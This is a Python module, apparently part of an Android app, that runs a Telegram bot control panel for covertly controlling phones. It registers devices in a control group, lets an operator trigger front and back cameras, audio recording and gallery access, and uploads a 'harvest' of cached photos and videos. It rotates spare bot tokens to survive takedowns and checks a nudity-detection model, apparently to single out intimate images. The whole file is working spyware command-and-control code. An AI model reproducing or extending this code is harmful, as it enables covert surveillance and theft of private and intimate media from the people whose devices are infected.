# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import requests
import sys
import importlib
import secrets
from collections import deque
from datetime import datetime

# ========== إعداد المسار الموحد ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if P not in sys.path:
    sys.path.insert(0, P)

# التأكد من وجود مجلد .cache_thumb المستخدم لعملية الحصاد
CACHE_THUMB = os.path.join(P, ".cache_thumb")
if not os.path.exists(CACHE_THUMB):
    os.makedirs(CACHE_THUMB)

logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')

TG_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
}

# ========== قفل للعمليات المتزامنة ==========
_session_lock = threading.Lock()
_device_lock = threading.Lock()


class T:
    def __init__(self, m, active_tokens, reserve_tokens, ctrl_id, vault_id, app_password):
        self.m = m
        self.device_id = getattr(m, 'did', 'unknown_device')
        self.dvs_file = os.path.join(P, "dvs.json")
        self.ses_file = os.path.join(P, "ses.json")
        self.ses = {}
        self.dvs = {}
        self.p_upd = deque(maxlen=200)
        self.rn = True
        self._polling_thread = None

        self.active_tokens = [t for t in active_tokens if t]  # تصفية التوكنات الفارغة
        self.reserve_tokens = [t for t in reserve_tokens if t]  # تصفية التوكنات الفارغة
        self.ctrl = ctrl_id
        self.dat = vault_id
        self.vlt = vault_id  # إضافة vlt (متوافق مع الملفات الأخرى)
        self.pw = app_password

        # إحصائيات
        self._api_calls = 0
        self._api_failures = 0

        self._load()
        threading.Thread(target=self._session_cleaner, daemon=True, name="SessionCleaner").start()
        threading.Thread(target=self._heartbeat_worker, daemon=True, name="HeartbeatWorker").start()

    # ========== إدارة الملفات ==========
    def _load(self):
        """تحميل البيانات من ملفات JSON"""
        for path, target in [(self.dvs_file, self.dvs), (self.ses_file, self.ses)]:
            if os.path.exists(path):
                try:
                    with open(path, 'r', encoding='utf-8') as f:
                        target.update(json.load(f))
                except Exception as e:
                    logging.error(f"Load error {path}: {e}")

    def _save(self):
        """حفظ البيانات إلى ملفات JSON"""
        try:
            with _device_lock:
                with open(self.dvs_file, 'w', encoding='utf-8') as f:
                    json.dump(self.dvs, f, ensure_ascii=False, indent=2)
            with _session_lock:
                with open(self.ses_file, 'w', encoding='utf-8') as f:
                    json.dump(self.ses, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logging.error(f"Save error: {e}")

    # ========== إدارة الجلسات ==========
    def _session_cleaner(self):
        """تنظيف الجلسات المنتهية كل ساعة"""
        while self.rn:
            try:
                now = time.time()
                expired = [cid for cid, exp in self.ses.items() if exp < now]
                if expired:
                    with _session_lock:
                        for cid in expired:
                            self.ses.pop(cid, None)
                    self._save()
            except Exception as e:
                logging.error(f"Session cleaner error: {e}")
            time.sleep(3600)

    # ========== دوال البوتات ==========
    def _next_token(self):
        """اختيار توكن عشوائي بشكل آمن"""
        if not self.active_tokens:
            return None
        try:
            # استخدام secrets.choice للأمان
            return secrets.choice(self.active_tokens)
        except:
            # fallback آمن
            import random
            return random.choice(self.active_tokens)

    def _emergency_switch(self, bad_token):
        """تبديل توكن فاشل بتوكن احتياطي"""
        if bad_token in self.active_tokens:
            idx = self.active_tokens.index(bad_token)
            self.active_tokens.remove(bad_token)
            if self.reserve_tokens:
                new_token = self.reserve_tokens.pop(0)
                self.active_tokens.append(new_token)
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": f"⚠️ <b>Emergency switch</b>\nBot #{idx+1} replaced. {len(self.reserve_tokens)} reserve left.",
                    "parse_mode": "HTML"
                })
            else:
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": "🚨 <b>CRITICAL: No reserve bots left!</b>",
                    "parse_mode": "HTML"
                })

    def _heartbeat_worker(self):
        """إرسال نبضات حياة كل 6 ساعات"""
        while self.rn:
            time.sleep(21600)  # 6 ساعات
            if not self.reserve_tokens:
                continue
            hb_bot = secrets.choice(self.reserve_tokens)
            try:
                url = f"https://api.telegram.org/bot{hb_bot}/sendMessage"
                data = {"chat_id": self.dat, "text": f"❤️ system heartbeat {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
                requests.post(url, data=data, timeout=10, verify=True)
            except Exception as e:
                logging.error(f"Heartbeat error: {e}")

    # ========== API الأساسية ==========
    def _api(self, method, data=None, files=None, retry=3):
        """إرسال طلب إلى Telegram API مع إعادة محاولة"""
        self._api_calls += 1
        last_token = None

        for attempt in range(retry):
            token = self._next_token()
            if not token:
                logging.error(f"No token available for {method}")
                return None

            if attempt > 0 and token == last_token:
                token = self._next_token()
                if not token:
                    return None
            last_token = token

            try:
                url = f"https://api.telegram.org/bot{token}/{method}"
                resp = requests.post(
                    url,
                    data=data,
                    files=files,
                    headers=TG_HEADERS,
                    timeout=30,
                    verify=True
                )

                if resp.status_code != 200:
                    logging.warning(f"HTTP {resp.status_code} for {method}")
                    time.sleep(1)
                    continue

                result = resp.json()
                if result.get('ok'):
                    return result

                error = result.get('error_code')
                if error == 429:  # Too Many Requests
                    retry_after = result.get('parameters', {}).get('retry_after', 2)
                    logging.warning(f"Rate limited, waiting {retry_after}s")
                    time.sleep(retry_after)
                    continue
                elif error in (401, 403):  # Unauthorized/Forbidden
                    self._emergency_switch(token)
                    continue
                else:
                    logging.warning(f"API error {error}: {result.get('description', 'Unknown')}")
                    time.sleep(1)

            except requests.exceptions.Timeout:
                logging.error(f"Timeout for {method}, attempt {attempt+1}")
                time.sleep(2)
            except requests.exceptions.ConnectionError:
                logging.error(f"Connection error for {method}, attempt {attempt+1}")
                time.sleep(3)
            except Exception as e:
                logging.error(f"API error {method}: {e}")
                time.sleep(1)

        self._api_failures += 1
        return None

    # ========== تسجيل الأجهزة والإشعارات ==========
    def reg(self, device_id, device_model):
        """تسجيل جهاز جديد في مجموعة التحكم"""
        if not device_id:
            logging.error("Cannot register device: no device_id")
            return None

        with _device_lock:
            if device_id in self.dvs:
                return self.dvs[device_id].get('t')

            topic_name = f"📱 {device_model[:12]} | {device_id[:4]}"
            res = self._api("createForumTopic", {"chat_id": self.ctrl, "name": topic_name})

            if res and res.get('ok'):
                topic_id = res['result']['message_thread_id']
                self.dvs[device_id] = {"n": device_model, "t": topic_id}
                self._save()

                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "message_thread_id": topic_id,
                    "text": f"<b>✅ Device registered</b>\n<b>{device_model}</b>\n<code>{device_id}</code>",
                    "parse_mode": "HTML"
                })
                return topic_id

            logging.error(f"Device registration failed for {device_id}")
            return None

    def notify_harvest(self, device_id, count):
        """إرسال إشعار بحصاد جديد"""
        dev = self.dvs.get(device_id)
        if dev and 't' in dev:
            msg = (
                f"📦 <b>Auto harvest</b>\n"
                f"Device: {dev['n']}\n"
                f"Items: {count}\n"
                f"Time: {datetime.now().strftime('%H:%M:%S')}"
            )
            self._api("sendMessage", {
                "chat_id": self.ctrl,
                "message_thread_id": dev['t'],
                "text": msg,
                "parse_mode": "HTML"
            })

    # ========== عدد الملفات المعلقة (محسّن) ==========
    def _count_pending_harvest(self):
        """
        حساب عدد الملفات المعلقة في مجلد الحصاد.
        - يتحقق من وجود المجلد وينشئه إذا لزم الأمر.
        - يتجاهل الملفات المخفية (التي تبدأ بنقطة).
        - يعيد 0 في حالة أي خطأ.
        """
        try:
            # التأكد من وجود المجلد، وإنشاؤه إذا لم يكن موجوداً
            if not os.path.exists(CACHE_THUMB):
                os.makedirs(CACHE_THUMB, exist_ok=True)
                return 0

            # التأكد من أن المسار هو مجلد وليس ملفاً
            if not os.path.isdir(CACHE_THUMB):
                logging.error(f"CACHE_THUMB path is not a directory: {CACHE_THUMB}")
                return 0

            # عد الملفات غير المخفية (لا تبدأ بنقطة) والتي هي ملفات فعلية
            files = [
                f for f in os.listdir(CACHE_THUMB)
                if not f.startswith('.') and os.path.isfile(os.path.join(CACHE_THUMB, f))
            ]
            return len(files)

        except Exception as e:
            logging.error(f"Count pending harvest error: {e}")
            return 0

    # ========== أزرار التحكم ==========
    def _main_keyboard(self):
        """لوحة المفاتيح الرئيسية"""
        return {"inline_keyboard": [
            [{"text": "📱 Connected devices", "callback_data": "ld"}],
            [{"text": "🧠 AI Status", "callback_data": "ai_status"}, {"text": "🔄 Renew session", "callback_data": "rnw"}],
            [{"text": "🚪 Logout", "callback_data": "ext"}]
        ]}

    def _device_keyboard(self, device_id):
        """لوحة مفاتيح الجهاز"""
        count = self._count_pending_harvest()
        harvest_text = f"📦 Harvest ({count})" if count > 0 else "📦 Harvest (empty)"
        return {"inline_keyboard": [
            [{"text": "📸 Back camera", "callback_data": f"cam_{device_id}"}, {"text": "🤳 Front camera", "callback_data": f"camf_{device_id}"}],
            [{"text": "🎙️ Record audio", "callback_data": f"mic_{device_id}"}, {"text": harvest_text, "callback_data": f"hrv_{device_id}"}],
            [{"text": "🖼️ Gallery", "callback_data": f"media_{device_id}"}, {"text": "🚀 Send now", "callback_data": f"send_now_{device_id}"}],
            [{"text": "🔙 Back", "callback_data": "ld"}]
        ]}

    def _show_harvest_details(self, chat_id):
        """عرض تفاصيل الملفات المعلقة"""
        if not os.path.exists(CACHE_THUMB):
            self._api("sendMessage", {"chat_id": chat_id, "text": "📭 No pending files."})
            return

        try:
            files = [f for f in os.listdir(CACHE_THUMB) if f.lower().endswith(('.jpg', '.png', '.mp4'))]
            if not files:
                self._api("sendMessage", {"chat_id": chat_id, "text": "📭 Harvest folder empty."})
                return

            total_size = sum(os.path.getsize(os.path.join(CACHE_THUMB, f)) for f in files)
            details = (
                f"📊 **Harvest report**\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🖼️ Files: `{len(files)}`\n"
                f"💾 Size: `{total_size/(1024*1024):.2f} MB`\n"
                f"⏰ Updated: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
                f"Use '🚀 Send now' to upload immediately."
            )
            self._api("sendMessage", {"chat_id": chat_id, "text": details, "parse_mode": "Markdown"})
        except Exception as e:
            logging.error(f"Harvest details error: {e}")
            self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Error: {str(e)[:100]}"})

    # ========== معالجة الرسائل والكولباك ==========
    def _is_authorized(self, chat_id):
        """التحقق من صلاحية الجلسة"""
        return time.time() < self.ses.get(str(chat_id), 0)

    def _handle_message(self, update):
        """معالجة الرسائل الواردة"""
        msg = update.get('message', {})
        chat_id = msg.get('chat', {}).get('id')
        text = msg.get('text', '')
        if not chat_id:
            return

        if text.startswith('/login'):
            parts = text.split()
            if len(parts) >= 2 and parts[1].strip() == self.pw:
                with _session_lock:
                    self.ses[str(chat_id)] = time.time() + 14400
                self._save()
                self._api("sendMessage", {
                    "chat_id": chat_id,
                    "text": "🔓 Login successful",
                    "reply_markup": json.dumps(self._main_keyboard())
                })
            else:
                self._api("sendMessage", {"chat_id": chat_id, "text": "❌ Wrong password"})
        elif self._is_authorized(chat_id) and text == '/menu':
            self._api("sendMessage", {
                "chat_id": chat_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })
        elif text == '/status':
            status = self.get_status()
            status_text = (
                f"📊 **Status**\n"
                f"━━━━━━━━━━━━━━━\n"
                f"Active tokens: `{len(self.active_tokens)}`\n"
                f"Reserve tokens: `{len(self.reserve_tokens)}`\n"
                f"Devices: `{len(self.dvs)}`\n"
                f"Sessions: `{len(self.ses)}`\n"
                f"API calls: `{self._api_calls}`\n"
                f"API failures: `{self._api_failures}`\n"
                f"Pending files: `{self._count_pending_harvest()}`"
            )
            self._api("sendMessage", {"chat_id": chat_id, "text": status_text, "parse_mode": "Markdown"})

    def _handle_callback(self, update):
        """معالجة استدعاءات الأزرار"""
        cb = update.get('callback_query', {})
        cb_id = cb.get('id')
        if not cb_id:
            return

        # منع التكرار
        if cb_id in self.p_upd:
            return
        self.p_upd.append(cb_id)

        # تنظيف قائمة الطلبات إذا كبرت
        if len(self.p_upd) > 150:
            self.p_upd.clear()

        chat_id = cb.get('message', {}).get('chat', {}).get('id')
        msg_id = cb.get('message', {}).get('message_id')
        data = cb.get('data', '')

        if not chat_id or not msg_id:
            return

        # تأكيد استلام الكولباك
        self._api("answerCallbackQuery", {"callback_query_id": cb_id})

        if not self._is_authorized(chat_id):
            self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ Session expired, use /login"})
            return

        # ==== معالجة الأوامر ====
        if data == "ld":
            if not self.dvs:
                self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ لا توجد أجهزة مرتبطة حالياً."})
                return
            kb = {"inline_keyboard": []}
            for did, info in self.dvs.items():
                kb["inline_keyboard"].append([{"text": f"📱 {info['n']}", "callback_data": f"dev_{did}"}])
            kb["inline_keyboard"].append([
                {"text": "🔄 Refresh", "callback_data": "ld"},
                {"text": "🔙 Back", "callback_data": "main"}
            ])
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "<b>Select device:</b>",
                "reply_markup": json.dumps(kb),
                "parse_mode": "HTML"
            })
            return

        if data.startswith("dev_"):
            did = data[4:]
            if did in self.dvs:
                self._api("editMessageText", {
                    "chat_id": chat_id,
                    "message_id": msg_id,
                    "text": f"🕹️ <b>{self.dvs[did]['n']}</b>",
                    "reply_markup": json.dumps(self._device_keyboard(did)),
                    "parse_mode": "HTML"
                })
            return

        if data.startswith("hrv_"):
            self._show_harvest_details(chat_id)
            return

        if data.startswith("send_now_"):
            # تصحيح الفهرسة: send_now_ = 9 أحرف
            did = data[9:]
            try:
                import commands
                importlib.reload(commands)
                commands.force_send_zip(self.m, did, self, chat_id)
            except Exception as e:
                logging.error(f"Send now error: {e}")
                self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {e}"})
            return

        if data == "ai_status":
            ai_loaded = (
                hasattr(self.m, 'nude_detector') and
                self.m.nude_detector and
                hasattr(self.m.nude_detector, 'is_ready') and
                self.m.nude_detector.is_ready()
            )
            status = "✅ Active" if ai_loaded else "❌ Not ready"
            loading = " (loading...)" if getattr(self.m.nude_detector, '_loading_engine', False) else ""
            self._api("answerCallbackQuery", {
                "callback_query_id": cb_id,
                "text": f"AI: {status}{loading}",
                "show_alert": True
            })
            return

        if data == "rnw":
            with _session_lock:
                self.ses[str(chat_id)] = time.time() + 14400
            self._save()
            self._api("answerCallbackQuery", {
                "callback_query_id": cb_id,
                "text": "✅ Session renewed until " + datetime.fromtimestamp(time.time() + 14400).strftime('%H:%M'),
                "show_alert": True
            })
            return

        if data == "ext":
            with _session_lock:
                self.ses.pop(str(chat_id), None)
            self._save()
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "🔒 Logged out."
            })
            return

        if data == "main":
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })
            return

        # تمرير الأوامر الأخرى إلى commands.py
        try:
            import commands
            importlib.reload(commands)
            commands.ex(data, self, self.m, chat_id, cb_id)
        except Exception as e:
            logging.error(f"Command error: {e}")
            self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Error: {str(e)[:100]}"})

    # ========== حلقة الاستقبال ==========
    def _polling(self):
        """حلقة استقبال التحديثات من Telegram"""
        offset = 0
        consecutive_errors = 0

        while self.rn:
            token = self._next_token()
            if not token:
                time.sleep(5)
                continue

            try:
                url = f"https://api.telegram.org/bot{token}/getUpdates"
                params = {
                    "offset": offset,
                    "timeout": 25,
                    "allowed_updates": json.dumps(["message", "callback_query"])
                }
                resp = requests.get(
                    url,
                    params=params,
                    headers=TG_HEADERS,
                    timeout=30,
                    verify=True
                )

                if resp.status_code != 200:
                    consecutive_errors += 1
                    time.sleep(min(consecutive_errors * 2, 60))
                    continue

                data = resp.json()
                if data.get('ok'):
                    consecutive_errors = 0
                    for upd in data.get('result', []):
                        offset = upd['update_id'] + 1
                        if 'message' in upd:
                            self._handle_message(upd)
                        if 'callback_query' in upd:
                            self._handle_callback(upd)
                else:
                    logging.warning(f"Polling error: {data}")
                    time.sleep(2)

            except requests.exceptions.Timeout:
                consecutive_errors += 1
                time.sleep(2)
            except requests.exceptions.ConnectionError:
                consecutive_errors += 1
                logging.error("Connection error in polling")
                time.sleep(5)
            except Exception as e:
                consecutive_errors += 1
                logging.error(f"Polling exception: {e}")
                time.sleep(min(consecutive_errors * 2, 30))

    # ========== بدء التشغيل ==========
    def start(self):
        """بدء عمل Telegram UI"""
        if not self.active_tokens:
            logging.error("No active tokens, Telegram UI cannot start")
            return False

        # تنظيف قائمة الطلبات
        self.p_upd.clear()

        self._polling_thread = threading.Thread(target=self._polling, daemon=True, name="TelegramPolling")
        self._polling_thread.start()
        logging.info(f"Telegram UI started: {len(self.active_tokens)} active, {len(self.reserve_tokens)} reserve")
        return True

    def stop(self):
        """إيقاف Telegram UI"""
        self.rn = False
        if self._polling_thread and self._polling_thread.is_alive():
            try:
                self._polling_thread.join(timeout=5)
            except:
                pass
        logging.info("Telegram UI stopped")

    # ========== الحصول على الحالة ==========
    def get_status(self):
        """الحصول على حالة الاتصال"""
        return {
            "running": self.rn,
            "active_tokens": len(self.active_tokens),
            "reserve_tokens": len(self.reserve_tokens),
            "devices": len(self.dvs),
            "sessions": len(self.ses),
            "api_calls": self._api_calls,
            "api_failures": self._api_failures,
            "pending_files": self._count_pending_harvest()
        }


# ========== دالة المصنع ==========
def create(m, active_tokens, reserve_tokens, ctrl_id, vault_id, app_password):
    return T(m, active_tokens, reserve_tokens, ctrl_id, vault_id, app_password)
